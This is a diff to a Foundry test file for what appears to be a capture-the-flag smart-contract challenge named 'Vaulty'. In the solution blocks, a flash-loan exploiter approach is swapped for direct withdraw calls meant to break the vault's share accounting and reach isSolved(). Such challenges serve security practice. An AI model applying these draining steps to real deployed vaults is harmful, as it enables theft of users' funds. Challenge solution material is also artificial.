@@ -47,6 +47,14 @@ contract VaultyTest is Test, VaultyDeployer {
         //     Write your solution here       //
         //////////////////////////////////////*/
         vaulty.deposit{value: 15 ether}();
+        console2.log("total assets: ", vaulty.totalAssets());
+        console2.log("total supply: ", vaulty.totalSupply());
+        vaulty.withdraw(0);
+        console2.log("total assets: ", vaulty.totalAssets());
+        console2.log("total supply: ", vaulty.totalSupply());
+        /*//////////////////////////////////////
+        //         Do not touch this          //
+        //////////////////////////////////////*/
         vm.stopPrank();
 
         vm.startPrank(alice);
@@ -58,9 +66,12 @@ contract VaultyTest is Test, VaultyDeployer {
         //     Write your solution here       //
         //////////////////////////////////////*/
         // Exploiter exploiter = new Exploiter(address(vaulty));
-        address exploiter = vyperDeployer.deployContract("test/romeroadrian-vaulty/", "Exploiter");
-        vaulty.flashLoan(address(exploiter), 30 ether);
-        // exploiter.withdraw();
+        // address exploiter = vyperDeployer.deployContract("test/romeroadrian-vaulty/", "Exploiter");
+        console2.log("total assets: ", vaulty.totalAssets());
+        console2.log("total supply: ", vaulty.totalSupply());
+        vaulty.withdraw(15 * 10 ** 9);
+        console2.log("total assets: ", vaulty.totalAssets());
+        console2.log("total supply: ", vaulty.totalSupply());
         vm.stopPrank();
 
         assertTrue(vaulty.isSolved());
